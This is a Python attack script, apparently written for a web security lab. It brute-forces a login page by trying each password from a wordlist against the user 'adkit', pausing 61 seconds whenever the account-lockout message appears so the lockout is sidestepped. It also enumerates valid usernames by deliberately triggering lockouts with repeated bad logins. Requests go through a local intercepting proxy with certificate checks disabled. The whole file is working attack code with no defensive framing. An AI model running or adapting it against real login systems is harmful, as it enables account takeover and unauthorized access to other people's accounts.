import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def getpassword(url,user):
    path = "login"
    with open('passwords','r') as passwords:
        password = passwords.readlines()
        for p in password:
            p = p.strip('\n')

            params = {'username': user, 'password':p}
            r = requests.post(url+path, data=params, verify=False, proxies=proxies)
                
            if "too many incorrect login attempts" in r.text:
                print (params)
                # Sleep for 61 seconds as login is blocked for 1 minutes
                time.sleep(61)
def getuser(url):

    path = "login"
    with open('usernames','r') as users:
        user = users.readlines()
        for u in user:
            u = u.strip('\n')
            for i in range(5):
                #print (u+"---"+str(i))
                # try now
                params = {'username': u, 'password':'pppppppppppppppppppppppppppppppp'}
                r = requests.post(url+path, data=params, verify=False, proxies=proxies)
                
            if "too many incorrect login attempts" in r.text:
                print (params)
                break
def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("[+] Brute-Forcing login page - Bypassing account lock")

    getpassword(url,'adkit')

if __name__ == "__main__":
    main()